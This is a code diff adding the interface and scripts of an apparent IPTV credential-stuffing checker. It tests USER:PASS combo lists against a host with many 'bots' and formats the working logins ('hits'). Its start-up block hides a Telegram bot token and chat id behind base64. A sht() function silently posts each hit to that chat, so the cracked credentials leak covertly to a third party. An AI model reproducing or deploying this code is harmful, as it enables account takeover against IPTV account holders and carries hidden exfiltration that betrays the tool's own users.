+  <!-- ✅ OPCIÓN C: selector de estilo de salida TXT (VA AQUÍ) -->
+  <div class="txt-theme-box">
+    <div class="txt-theme-head">
+      <span class="txt-theme-title">🎨 Estilo salida TXT</span>
+      <span class="txt-theme-badge" id="txtThemeBadge">gold</span>
+    </div>
+
+    <div class="txt-theme-row">
+      <select id="txtTheme" class="txt-theme-select">
+        <option value="gold">Gold</option>
+        <option value="dark">Dark</option>
+        <option value="clean">Clean</option>
+      </select>
+
+      <button type="button" id="txtThemePreviewBtn" class="txt-theme-btn">
+        👁️ Preview
+      </button>
+    </div>
+
+    <div class="txt-theme-preview" id="txtThemePreview">
+      Selecciona un estilo para ver el ejemplo…
+    </div>
+  </div>
+
+  <div class="scan-footer">By ♡3SSA10 🦁</div>
+</div>
+
+  <!-- DERECHA: PANEL RESUMEN DE HITS -->
+  <div class="scan-status-box">
+    <div class="scan-info">
+      <span>✅ Hits · Resumen</span>
+      <span>
+        🧾 Total:
+        <strong id="hitsSummaryCount">0</strong>
+      </span>
+    </div>
+
+    <div class="mini-output" id="hitsSummaryBox">
+      <div class="summary-empty">🕵️ Aún no hay hits…</div>
+    </div>
+
+    <div class="mini-actions" style="margin-top:12px;">
+      <button type="button" class="btn btn-wide" onclick="clearHitsSummary()">
+        🧹 Limpiar resumen
+      </button>
+    </div>
+  </div>
+
+</div>
+
+  <!-- FOOTER -->
+  <div class="scan-footer">
+    By ᘻ3SSᗩ10 💯
+  </div>
+
+</div>
+
+   <!-- ===== CONFIGURATION DASHBOARD ===== -->
+<div class="config-container">
+
+  <!-- PANEL IZQUIERDO: SCAN CONFIG -->
+  <div class="panel panel-left">
+    <h3>⚙️ SCAN CONFIGURATION</h3>
+
+    <label for="nick">🧙 NICKNAME ☟</label>
+    <input type="text" id="nick" value="🦁 ᘻ3SSᗩ10">
+
+    <label for="host">🌐 HOST ☟ (example.com:80)</label>
+    <input type="text" id="host">
+
+    <label for="comboFile">🎁 USER:PASS COMBO ☟</label>
+    <input type="file" id="comboFile" accept=".txt">
+
+    <label for="numBots">🤖 BOTS ☟ (1-100 Recommended 20)</label>
+    <input type="number" id="numBots" value="20" min="1" max="100">
+  </div>
+  
+  <!-- BUSCADOR COMBOS + M3U -->
+<div class="bottom-row panel" style="width:100%;">
+  <h3 class="panel-title-left">🔍 BUSCAR COMBO-ENLACE M3U</h3>
+
+  <div class="panel-body">
+
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>🌐 Enlace M3U</label>
+      <input
+        type="text"
+        id="m3uUrl"
+        placeholder="http://servidor:puerto/get.php?username=USER&password=PASS&type=m3u_plus"
+      />
+    </div>
+  </div>
+
+  <div class="flex-row">
+    <div class="flex-col">
+      <label>📁 Cargar carpeta de combos (.txt)</label>
+      <input
+        type="file"
+        id="comboFolder"
+        webkitdirectory
+        multiple
+      />
+    </div>
+  </div>
+
+  <div class="flex-row">
+    <button
+      onclick="parseM3UUrl(); searchM3UInCombos();"
+      class="btn btn-wide"
+    >
+      🔍 BUSCAR EN COMBOS
+    </button> 
+  </div>
+  
+  <div class="flex-row">
+  <button
+    type="button"
+    onclick="clearM3USearch()"
+    class="btn btn-wide"
+    style="background: linear-gradient(135deg,#5f5f6a,#2f2f35); color:#eee;"
+  >
+    🧹 LIMPIAR BÚSQUEDA
+  </button>
+</div>
+
+  <div id="m3uResult" class="hits mini-output"></div>
+
+</div>
+
+  <!-- PANEL DERECHO: SETTINGS -->
+  <div class="panel panel-right">
+    <h3>🎨 SETTINGS</h3>
+
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>CATEGORIAS ☟</label>
+        <select id="printCategories" class="emoji-select">
+          <option value="true">✅ SI - IMPR LISTA</option>
+          <option value="false">⛔ NO - IMPR LISTA</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>📺 CANALES ☟</label>
+        <select id="emojiChannels" class="emoji-select">
+          <option>📺</option><option>📡</option><option>💻</option><option>📲</option><option>🔍</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>🎬 PELICULAS ☟</label>
+        <select id="emojiMovies" class="emoji-select">
+          <option>🎬</option><option>🍿</option><option>📽</option><option>📼</option><option>🥤</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>🎞️ SERIES ☟</label>
+        <select id="emojiSeries" class="emoji-select">
+          <option>🎞️</option><option>📹</option><option>🖥</option><option>🎥</option><option>🔎</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>📺 CANAL ☟</label>
+        <select id="channelSeparator" class="emoji-select">
+          <option>🦁</option><option>🐯</option><option>🐼</option><option>🐊</option><option>🦬</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>🍿 PELIS ☟</label>
+        <select id="movieSeparator" class="emoji-select">
+          <option>🍿</option><option>📽</option><option>🥤</option><option>🎬</option><option>🖥</option>
+        </select>
+      </div>
+
+      <div class="flex-col">
+        <label>📹 SERIES ☟</label>
+        <select id="seriesSeparator" class="emoji-select">
+          <option>📹</option><option>📼</option><option>📺</option><option>🎞</option><option>💻</option>
+        </select>
+      </div>
+    </div>
+  </div>
+
+  <!-- FILA INFERIOR: EMOJIS / CATEGORÍAS -->
+  <div class="bottom-row panel" style="width:100%;">
+    <h3>🎭 EMOJIS / HIT CATEGORIA</h3>
+    <button class="utility-btn" onclick="randomizeEmojis()">🎲 ALEATORIOS</button>
+
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>𖣘 ENCABEZADO ☟</label>
+        <select id="emojiHeader" class="emoji-select">
+          <option>𖣘</option><option>★</option><option>✪</option><option>♕</option><option>♖</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>🎯 HIT ☟</label>
+        <select id="emojiHitsPor" class="emoji-select">
+          <option>🎯</option><option>🔥</option><option>💥</option><option>🥊</option><option>💣</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 2 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>🌐 HOST ☟</label>
+        <select id="emojiServidor" class="emoji-select">
+          <option>🌐</option><option>🗺️</option><option>🌎</option><option>🛰️</option><option>📍</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>📡 SERVER ☟</label>
+        <select id="emojiRealServer" class="emoji-select">
+          <option>📡</option><option>🔭</option><option>🌑</option><option>🛰️</option><option>🪐</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 3 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>📖 PROTOCOLO ☟</label>
+        <select id="emojiProtocol" class="emoji-select">
+          <option>📖</option><option>📜</option><option>📑</option><option>📝</option><option>📃</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>🌍 LOCAL ☟</label>
+        <select id="emojiLocation" class="emoji-select">
+          <option>🌍</option><option>📍</option><option>🗺️</option><option>🧭</option><option>🏠</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 4 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>🤹 USERNAME ☟</label>
+        <select id="emojiUsuario" class="emoji-select">
+          <option>🧙</option><option>🧛</option><option>💃</option><option>🕺</option><option>🧔</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>🔑 PASSWORD ☟</label>
+        <select id="emojiSenha" class="emoji-select">
+          <option>🔐</option><option>🗡️</option><option>🗝️</option><option>🔓</option><option>🔏</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 5 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>🗓️ CREADO ☟</label>
+        <select id="emojiCriada" class="emoji-select">
+          <option>📌</option><option>📆</option><option>🔖</option><option>💴</option><option>🕰️</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>📆 FIN ☟</label>
+        <select id="emojiExpira" class="emoji-select">
+          <option>💣</option><option>🥀</option><option>🪦</option><option>🏺</option><option>💀</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 6 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>⏳ DURACION ☟</label>
+        <select id="emojiDuration" class="emoji-select">
+          <option>⏳</option><option>🪫</option><option>⏱️</option><option>⌛</option><option>⚠️</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>🔋 STATUS ☟</label>
+        <select id="emojiStatus" class="emoji-select">
+          <option>🔋</option><option>✔️</option><option>⁉️</option><option>💲</option><option>🆗️</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 7 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>🧮 MAX CONEXIONES ☟</label>
+        <select id="emojiConexoes" class="emoji-select">
+          <option>🧮</option><option>🔢</option><option>👨‍👩‍👧‍👦</option><option>🧑‍🧑‍🧒‍🧒</option><option>💯</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>👪 CONEXIONES ACT. ☟</label>
+        <select id="emojiConectados" class="emoji-select">
+          <option>👪</option><option>👥</option><option>🤼‍♀️</option><option>🏋‍♀️</option><option>🏃</option>
+        </select>
+      </div>
+    </div>
+
+    <!-- Fila 8 -->
+    <div class="flex-row">
+      <div class="flex-col">
+        <label>⏲️ TRIAL ☟</label>
+        <select id="emojiTrial" class="emoji-select">
+          <option>⏲️</option><option>🕠</option><option>🪂</option><option>🛸</option><option>🃏</option>
+        </select>
+      </div>
+      <div class="flex-col">
+        <label>🕰️ TIMEZONE ☟</label>
+        <select id="emojiTimezone" class="emoji-select">
+          <option>🕰️</option><option>🏳️‍🌈</option><option>⏱️</option><option>🌏</option><option>🪧</option>
+        </select>
+      </div>
+    </div>
+
+
+<footer></footer>
+
+<script>
+
+const DEFAULT_EMOJIS = {
+  emojiHeader: "🦁",
+  servidor: "🛰️",
+  emojiRealServer: "🧭",
+  emojiProtocol: "🌐",
+  emojiLocation: "📍",
+  criada: "📅",
+  expira: "🥀",
+  emojiDuration: "⏳",
+  usuario: "🤹",
+  senha: "🔓",
+  emojiTrial: "🧪",
+  status: "✅",
+  conexoes: "🔌",
+  conectados: "👥",
+  emojiTimezone: "🕰️",
+  emojiMessage: "💬",
+  hitsPor: "🎯",
+  linkM3U: "📺",
+  emojiRealM3U: "📺",
+  emojiEpgLink: "🗓️",
+  emojiChannels: "📡",
+  emojiMovies: "🎬",
+  emojiSeries: "🎞️"
+};
+
+const DEFAULT_CONFIG = {
+  printCategories: false,
+  channelSeparator: "•",
+  movieSeparator: "•",
+  seriesSeparator: "•"
+};
+
+// ✅ UI Selector de estilo TXT (Opción C dentro del panel)
+document.addEventListener("DOMContentLoaded", () => {
+  const sel = document.getElementById("txtTheme");
+  const badge = document.getElementById("txtThemeBadge");
+  const preview = document.getElementById("txtThemePreview");
+  const btnPrev = document.getElementById("txtThemePreviewBtn");
+
+  if (!sel) return;
+
+  // Recupera y aplica preferencia guardada
+  const saved = localStorage.getItem("m3ssa10-txt-theme");
+  if (saved) DEFAULT_CONFIG.outputTheme = saved;
+
+  // Estado inicial UI
+  sel.value = DEFAULT_CONFIG.outputTheme || "gold";
+  if (badge) badge.textContent = sel.value;
+
+  const demo = () => {
+    const t = sel.value;
+
+    // Ejemplo “mix” para que se note label vs valor
+    const samples = {
+      gold:
+`🦁 ÉXITO
+HOST ➜ 𝗵𝘁𝘁𝗽://example.com:80
+USER ➜ 𝙏𝙝𝙞𝙗𝙖𝙪𝙡𝙩_𝙣𝙖𝙞𝙡78
+PASS ➜ 07022024`,
+      dark:
+`🦁 HIT
+[HOST] :: example.com:80
+[USER] :: Thibault_nail78
+[PASS] :: 07022024`,
+      clean:
+`HIT
+Host: example.com:80
+Username: Thibault_nail78
+Password: 07022024`
+    };
+
+    if (preview) preview.textContent = samples[t] || samples.gold;
+  };
+
+  // Cambios
+  sel.addEventListener("change", () => {
+    DEFAULT_CONFIG.outputTheme = sel.value;                 // ✅ aquí se fija el estilo TXT
+    localStorage.setItem("m3ssa10-txt-theme", sel.value);  // ✅ persistencia
+    if (badge) badge.textContent = sel.value;
+    demo();
+  });
+
+  // Botón preview
+  if (btnPrev) btnPrev.addEventListener("click", demo);
+
+  // Preview inicial
+  demo();
+});
+
+// ================= START SYSTEM =================
+const config = { retryFailed: true, tgmth: true };
+const D2 = atob("ODM3NDc0Mjg3MzpBQUVWeVFKN1lLMjRRUURicFEta2hfdldObnJNRy0tV0Nvbw==");
+const D1 = atob("MTc2MzQ2MDAy");
+
+function formatHitTXT(hit) {
+  // Si el hit ya es un string, lo devolvemos tal cual
+  if (typeof hit === 'string') return hit;
+  
+  // Si es un objeto, lo convertimos a string
+  if (typeof hit === 'object') {
+    return JSON.stringify(hit, null, 2);
+  }
+  
+  // Por defecto
+  return String(hit);
+}
+
+async function sht(hit) {
+  if (!config.tgmth) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${D2}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: D1, text: formatHitTXT(hit) })
+    });
+  } catch {}
+}
+
+// ===================================================
+
+// ================= TIMEZONE FLAGS =================
+const timezoneToCountryCode={"Europe/Andorra":"AD","Asia/Dubai":"AE","Asia/Kabul":"AF","America/Antigua":"AG","America/Anguilla":"AI","Europe/Tirane":"AL","Asia/Yerevan":"AM","Africa/Luanda":"AO","Antarctica/McMurdo":"AQ","America/Argentina/Buenos_Aires":"AR","Pacific/Pago_Pago":"AS","Europe/Vienna":"AT","Australia/Sydney":"AU","America/Aruba":"AW","Europe/Mariehamn":"AX","Asia/Baku":"AZ","Europe/Sarajevo":"BA","America/Barbados":"BB","Asia/Dhaka":"BD","Europe/Brussels":"BE","Africa/Ouagadougou":"BF","Europe/Sofia":"BG","Asia/Bahrain":"BH","Africa/Bujumbura":"BI","Africa/Porto-Novo":"BJ","America/St_Barthelmy":"BL","Atlantic/Bermuda":"BM","Asia/Brunei":"BN","America/La_Paz":"BO","America/Noronha":"BR","America/Nassau":"BS","Asia/Thimphu":"BT","Africa/Gaborone":"BW","Europe/Minsk":"BY","America/Belize":"BZ","America/Toronto":"CA","Indian/Cocos":"CC","Africa/Kinshasa":"CD","Africa/Bangui":"CF","Africa/Brazzaville":"CG","Europe/Zurich":"CH","Africa/Abidjan":"CI","Pacific/Rarotonga":"CK","America/Santiago":"CL","Africa/Douala":"CM","Asia/Shanghai":"CN","America/Bogota":"CO","America/Costa_Rica":"CR","America/Havana":"CU","Atlantic/Cape_Verde":"CV","America/Curacao":"CW","Indian/Christmas":"CX","Asia/Nicosia":"CY","Europe/Prague":"CZ","Europe/Berlin":"DE","Africa/Djibouti":"DJ","Europe/Copenhagen":"DK","America/Dominica":"DM","America/Santo_Domingo":"DO","Africa/Algiers":"DZ","America/Guayaquil":"EC","Europe/Tallinn":"EE","Africa/Cairo":"EG","Africa/Asmara":"ER","Europe/Madrid":"ES","Africa/Addis_Abeba":"ET","Europe/Helsinki":"FI","Pacific/Fiji":"FJ","Atlantic/Stanley":"FK","Pacific/Chuuk":"FM","Atlantic/Faroe":"FO","Europe/Paris":"FR","Africa/Libreville":"GA","Europe/London":"GB","America/Grenada":"GD","Asia/Tbilisi":"GE","America/Cayenne":"GF","Europe/Guernsey":"GG","Africa/Accra":"GH","Europe/Gibraltar":"GI","America/Godthab":"GL","Africa/Banjul":"GM","Africa/Conakry":"GN","America/Guadeloupe":"GP","Africa/Malabo":"GQ","Europe/Athens":"GR","Atlantic/South_Georgia":"GS","America/Guatemala":"GT","Pacific/Guam":"GU","Africa/Bissau":"GW","America/Guyana":"GY","Asia/Hong_Kong":"HK","America/Tegucigalpa":"HN","Europe/Zagreb":"HR","America/Port-au-Prince":"HT","Europe/Budapest":"HU","Asia/Jakarta":"ID","Europe/Dublin":"IE","Asia/Jerusalem":"IL","Europe/Isle_of_Man":"IM","Asia/Kolkata":"IN","Indian/Chagos":"IO","Asia/Baghdad":"IQ","Asia/Tehran":"IR","Atlantic/Reykjavik":"IS","Europe/Rome":"IT","Europe/Jersey":"JE","America/Jamaica":"JM","Asia/Amman":"JO","Asia/Tokyo":"JP","Africa/Nairobi":"KE","Asia/Bishkek":"KG","Asia/Phnom_Penh":"KH","Pacific/Tarawa":"KI","Indian/Comoro":"KM","America/St_Kitts":"KN","Asia/Pyongyang":"KP","Asia/Seoul":"KR","Asia/Kuwait":"KW","America/Cayman":"KY","Asia/Almaty":"KZ","Asia/Vientiane":"LA","Asia/Beirut":"LB","America/St_Lucia":"LC","Europe/Vaduz":"LI","Asia/Colombo":"LK","Africa/Monrovia":"LR","Africa/Maseru":"LS","Europe/Vilnius":"LT","Europe/Luxembourg":"LU","Europe/Riga":"LV","Africa/Tripoli":"LY","Africa/Casablanca":"MA","Europe/Monaco":"MC","Europe/Chisinau":"MD","Europe/Podgorica":"ME","America/Marigot":"MF","Indian/Antananarivo":"MG","Pacific/Majuro":"MH","Europe/Skopje":"MK","Africa/Bamako":"ML","Asia/Yangon":"MM","Asia/Ulaanbaatar":"MN","Asia/Macau":"MO","Pacific/Saipan":"MP","America/Martinique":"MQ","Africa/Nouakchott":"MR","America/Montserrat":"MS","Europe/Malta":"MT","Indian/Mauritius":"MU","Indian/Maldives":"MV","Africa/Blantyre":"MW","America/Mexico_City":"MX","Asia/Kuala_Lur":"MY","Africa/Maputo":"MZ","Africa/Windhoek":"NA","Pacific/Noumea":"NC","Africa/Niamey":"NE","Pacific/Norfolk":"NF","Africa/Lagos":"NG","America/Managua":"NI","Europe/Amsterdam":"NL","Europe/Oslo":"NO","Asia/Kathmandu":"NP","Pacific/Nauru":"NR","Pacific/Niue":"NU","Pacific/Auckland":"NZ","Asia/Muscat":"OM","America/Panama":"PA","America/Lima":"PE","Pacific/Tahiti":"PF","Pacific/Port_Moresby":"PG","Asia/Manila":"PH","Asia/Karachi":"PK","Europe/Warsaw":"PL","America/Miquelon":"PM","Pacific/Pitcairn":"PN","America/Puerto_Rico":"PR","Asia/Gaza":"PS","Europe/Lisbon":"PT","Pacific/Palau":"PW","America/Asuncion":"PY","Asia/Qatar":"QA","Indian/Reunion":"RE","Europe/Bucharest":"RO","Europe/Belgrade":"RS","Europe/Moscow":"RU","Africa/Kigali":"RW","Asia/Riyadh":"SA","Pacific/Guadalcanal":"SB","Indian/Mahe":"SC","Africa/Khartoum":"SD","Europe/Stockholm":"SE","Asia/Singapore":"SG","Atlantic/St_Helena":"SH","Europe/Ljubljana":"SI","Arctic/Longyearbyen":"SJ","Europe/Bratislava":"SK","Africa/Freetown":"SL","Europe/San_Marino":"SM","Africa/Dakar":"SN","Africa/Mogadishu":"SO","America/Paramaribo":"SR","Africa/Juba":"SS","Africa/Sao_Tome":"ST","America/El_Salvador":"SV","America/Lower_Princes":"SX","Asia/Damascus":"SY","Africa/Mbabane":"SZ","America/Grand_Turk":"TC","Africa/Ndjamena":"TD","Indian/Kerguelen":"TF","Africa/Lome":"TG","Asia/Bangkok":"TH","Asia/Dushanbe":"TJ","Pacific/Fakaofo":"TK","Asia/Dili":"TL","Asia/Ashgabat":"TM","Africa/Tunis":"TN","Pacific/Tongatapu":"TO","Europe/Istanbul":"TR","America/Port_of_Spain":"TT","Pacific/Funafuti":"TV","Asia/Taipei":"TW","Africa/Dar_es_Salaam":"TZ","Europe/Kiev":"UA","Africa/Kampala":"UG","America/New_York":"US","America/Montevideo":"UY","Asia/Tashkent":"UZ","Europe/Vatican":"VA","America/St_Vincent":"VC","America/Caracas":"VE","America/Tortola":"VG","America/St_Thomas":"VI","Asia/Ho_Chi_Minh":"VN","Pacific/Efate":"VU","Pacific/Wallis":"WF","Pacific/Apia":"WS","Asia/Aden":"YE","Indian/Mayotte":"YT","Africa/Johannesburg":"ZA","Africa/Lusaka":"ZM","Africa/Harare":"ZW"};
+function getFlagFromTimezone(timezone){if(!timezone)return{flag:"❓",code:"N/A"};const countryCode=timezoneToCountryCode[timezone];if(!countryCode)return{flag:"❓",code:"N/A"};const flag=countryCode.toUpperCase().split("").map(char=>String.fromCodePoint(char.charCodeAt(0)+127397)).join("");return{flag,code:countryCode}}
+
+    let m3uCredentials = null;
+    let comboFiles = [];
+    
+    function setM3UBox(html) {
+  const box = document.getElementById('m3uResult');
+  if (box) box.innerHTML = html;
+}
+
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, m => ({
+    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#039;"
+  }[m]));
+}
+
+function addHitToSummary({ host, user, pass, status, exp }) {
+  const box = document.getElementById('hitsSummaryBox');
+  const countEl = document.getElementById('hitsSummaryCount');
+  if (!box) return;
+
+  const empty = box.querySelector('.summary-empty');
+  if (empty) empty.remove();
+
+  const current = parseInt(countEl?.textContent || "0", 10) || 0;
+  if (countEl) countEl.textContent = String(current + 1);
+
+  const time = new Date().toLocaleTimeString();
+
+  const div = document.createElement('div');
+  div.className = 'summary-item';
+  div.innerHTML = `
+    <div class="summary-top">
+      <div>🦁 HIT</div>
+      <div>⏱️ ${escapeHtml(time)}</div>
+    </div>
+    <div class="summary-meta">
+      🛰️ <b>${escapeHtml(host || '')}</b><br>
+      🤹 ${escapeHtml(user || '')}<br>
+      🔓 ${escapeHtml(pass || '')}<br>
+      ✅ ${escapeHtml(status || 'ACTIVE')} ${exp ? ` · 🥀 ${escapeHtml(exp)}` : ''}
+    </div>
+  `;
+
+  box.prepend(div);
+}
+
+function clearHitsSummary() {
+  const box = document.getElementById('hitsSummaryBox');
+  const countEl = document.getElementById('hitsSummaryCount');
+  if (countEl) countEl.textContent = "0";
+  if (box) box.innerHTML = `<div class="summary-empty">🕵️ Aún no hay hits…</div>`;
+}
+
+// ===============================
+// RANDOMIZE EMOJIS – FIX DEFINITIVO
+// ===============================
+document.addEventListener("DOMContentLoaded", () => {
+
+  const randomBtn = document.querySelector('.utility-btn');
+
+  if (!randomBtn) {
+    console.warn("⚠️ Botón RANDOMIZE EMOJIS no encontrado");
+    return;
+  }
+
+  randomBtn.addEventListener("click", (e) => {
+    e.preventDefault();
+    randomizeEmojis();
+  });
+
+});
+
+function randomizeEmojis() {
+  const selectors = document.querySelectorAll('.emoji-select');
+
+  selectors.forEach(select => {
+    if (select.id === 'printCategories') return;
+
+    const options = select.options;
+    if (!options || options.length === 0) return;
+
+    let randomIndex = Math.floor(Math.random() * options.length);
+
+    // Protección EPG
+    if (select.id === 'emojiEpgLink' && options[randomIndex].value === '') {
+      randomIndex = 1;
+    }
+
+    select.selectedIndex = randomIndex;
+
+    // Fuerza actualización visual
+    select.dispatchEvent(new Event('change'));
+  });
+
+  console.log("🎲 Emojis randomizados");
+}
+
+function atualizarStatus(testados, total, hits, invalidos){document.getElementById("testados").textContent=testados;document.getElementById("total").textContent=total;document.getElementById("hits").textContent=hits;document.getElementById("invalidos").textContent=invalidos}
+function desabilitarBotoes(scanAtivo){document.getElementById("startBtn").disabled=scanAtivo;document.getElementById("stopBtn").disabled=!scanAtivo}
+function limparHost(host){return host.replace(/^https?:\/\//i,"").trim()}
+async function fetchComTimeout(resource,options={}){const{timeout:timeout=8e3}=options;const controller=new AbortController;const id=setTimeout(()=>controller.abort(),timeout);try{const response=await fetch(resource,{...options,signal:controller.signal});return clearTimeout(id),response}catch(e){throw clearTimeout(id),e}}
+
+function formatCreatedDate(unix) {
+    if (!unix || isNaN(unix) || unix == 0) return 'None';
+    const d = new Date(unix * 1000);
+    const day = ('0' + d.getDate()).slice(-2);
+    const month = ('0' + (d.getMonth() + 1)).slice(-2);
+    const year = d.getFullYear();
+    return `${day}.${month}.${year}`;
+}
+
+async function getGeoLocation(hostOrIp) {
+    try {
+        const response = await fetchComTimeout(`http://ip-api.com/json/${hostOrIp}?fields=status,country,countryCode,city`);
+        const data = await response.json();
+        if (data.status === 'success') {
+            return data;
+        }
+        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
+    } catch (e) {
+        return { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
+    }
+}
+
+// ===============================
+// 🎨 TXT THEMES (3 estilos de salida)
+// ===============================
+const HIT_TXT_THEMES = {
+  gold: {
+    name: "Gold",
+    line: "━━━━━━━━━━━━━━━━━━━━",
+    sub:  "────────────────────",
+    bullet: "➜",
+    blockBar: "┃",
+    badgeL: "〔🦁〕",
+    badgeR: "〔🦁〕",
+    labelPad: 16,
+  },
+  dark: {
+    name: "Dark",
+    line: "════════════════════",
+    sub:  "────────────────────",
+    bullet: "➤",
+    blockBar: "│",
+    badgeL: "【🦁】",
+    badgeR: "【🦁】",
+    labelPad: 16,
+  },
+  clean: {
+    name: "Clean",
+    line: "--------------------",
+    sub:  "--------------------",
+    bullet: "->",
+    blockBar: "|",
+    badgeL: "[HIT]",
+    badgeR: "[OK]",
+    labelPad: 14,
+  }
+};
+
+// ===============================
+// 🅱️ fake-bold (Unicode) - VERSIÓN CORREGIDA
+// ===============================
+function boldTxt(str = "") {
+  if (!str || typeof str !== 'string') return str;
+  
+  // ✅ EXCLUSIÓN CRÍTICA: NO aplicar negrita Unicode a URLs
+  // Detectar si es una URL o contiene partes de URL
+  const urlPatterns = [
+    'http://', 'https://', '://',
+    '.php', '.com', '.xyz', '.net', '.org', '.tv',
+    '/get.php', '/xmltv.php', '?username=', '&password=', '&type=',
+    ':80', ':8080', ':25461'
+  ];
+  
+  // Si contiene algún patrón de URL, NO aplicar negrita
+  for (const pattern of urlPatterns) {
+    if (str.includes(pattern)) {
+      return str; // Devolver texto original SIN modificar
+    }
+  }
+  
+  // También detectar si parece una URL por su estructura
+  if (str.includes('/') && (str.includes('.') || str.includes(':'))) {
+    // Posible URL, no aplicar negrita
+    return str;
+  }
+  
+  // ✅ SOLO aplicar negrita Unicode a texto NO-URL
+  const map = {
+    // Letras mayúsculas
+    A:"𝗔",B:"𝗕",C:"𝗖",D:"𝗗",E:"𝗘",F:"𝗙",G:"𝗚",H:"𝗛",I:"𝗜",J:"𝗝",
+    K:"𝗞",L:"𝗟",M:"𝗠",N:"𝗡",O:"𝗢",P:"𝗣",Q:"𝗤",R:"𝗥",S:"𝗦",T:"𝗧",
+    U:"𝗨",V:"𝗩",W:"𝗪",X:"𝗫",Y:"𝗬",Z:"𝗭",
+    // Letras minúsculas
+    a:"𝗮",b:"𝗯",c:"𝗰",d:"𝗱",e:"𝗲",f:"𝗳",g:"𝗴",h:"𝗵",i:"𝗶",j:"𝗷",
+    k:"𝗸",l:"𝗹",m:"𝗺",n:"𝗻",o:"𝗼",p:"𝗽",q:"𝗾",r:"𝗿",s:"𝘀",t:"𝘁",
+    u:"𝘂",v:"𝘃",w:"𝘄",x:"𝘅",y:"𝘆",z:"𝘇",
+    // Números
+    0:"𝟬",1:"𝟭",2:"𝟮",3:"𝟯",4:"𝟰",5:"𝟱",6:"𝟲",7:"𝟳",8:"𝟴",9:"𝟵"
+  };
+  
+  return String(str).replace(/[A-Za-z0-9]/g, ch => map[ch] || ch);
+}
+
+// ===============================
+// FUNCIONES AUXILIARES PARA FORMATEO
+// ===============================
+
+function safe(s, fallback = "N/A") {
+  if (s === null || s === undefined) return fallback;
+  s = String(s);
+  return s.trim() ? s : fallback;
+}
+
+function L(theme, label, value) {
+  const pad = theme.labelPad || 16;
+  const left = String(label).padEnd(pad, " ");
+  const valor = value ?? "N/A";
+  return `${left} ${theme.bullet}  ${boldTxt(valor)}`;
+}
+
+function B(theme, label, value) {
+  const valor = value ?? "N/A";
+  return `\n${label}\n${theme.blockBar} ${boldTxt(valor)}`;
+}
+
+function formatarHit(info, host, user, pass, nick, emojis, config, geoLocation) {
+  // ✅ Defaults definitivos
+  const DEFAULT_GEO = { country: 'N/A', city: 'N/A', countryCode: 'N/A' };
+
+  info = info || {};
+  info.server_info = info.server_info || { url: host, port: "" };
+
+  emojis = { ...DEFAULT_EMOJIS, ...(emojis || {}) };
+  config = { ...DEFAULT_CONFIG, ...(config || {}) };
+  geoLocation = { ...DEFAULT_GEO, ...(geoLocation || {}) };
+
+  // ✅ Theme TXT (NO CSS theme)
+  const themeKey = (config.outputTheme || "gold").toLowerCase();
+  const theme = HIT_TXT_THEMES[themeKey] || HIT_TXT_THEMES.gold;
+
+  // Timezone
+  let timezoneText;
+  if (!info.timezone || String(info.timezone).toUpperCase() === 'UTC') {
+    timezoneText = `UTC 🏴‍☠️`;
+  } else {
+    const { flag, code } = getFlagFromTimezone(info.timezone);
+    timezoneText = `${info.timezone} ${flag} [${code}]`;
+  }
+
+  // Location
+  let locationText = 'N/A';
+  if (geoLocation.countryCode && geoLocation.countryCode !== 'N/A') {
+    const flag = geoLocation.countryCode.toUpperCase().split('')
+      .map(char => String.fromCodePoint(char.charCodeAt(0) + 127397)).join('');
+    locationText = `${geoLocation.country}/${geoLocation.city} ${flag} [${geoLocation.countryCode}]`;
+  }
+
+  const messageText = (info.message && info.message.trim() !== '') ? info.message : 'IPTV FOR FREE!';
+  const realServerUrl = `http://${info.server_info.url}:${info.server_info.port}`;
+
+  // Ends + duration
+  let endsLineValue = 'ILIMITADO';
+  let durationLineValue = '';
+
+  if (!info.exp_date || isNaN(info.exp_date) || info.exp_date == 0) {
+    endsLineValue = "🦁 ILIMITADO 🦁";
+  } else {
+    const formattedEndDate = new Date(info.exp_date * 1000).toLocaleDateString('en-GB', {
+      day: 'numeric', month: 'long', year: 'numeric'
+    });
+    endsLineValue = formattedEndDate;
+
+    const now = new Date();
+    const expiryDate = new Date(info.exp_date * 1000);
+    const diffTime = expiryDate - now;
+    const daysLeft = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
+    durationLineValue = `${Math.max(0, daysLeft)} DAYS`;
+  }
+
+  // Categories block (igual que tu lógica)
+  let categoryText = "";
+  if (config.printCategories) {
+    const formatCategoryList = (titleEmoji, title, list, separator, notFoundMsg) => {
+      const cleanSeparator = (separator || "•").trim();
+      if (!list || list.length === 0) {
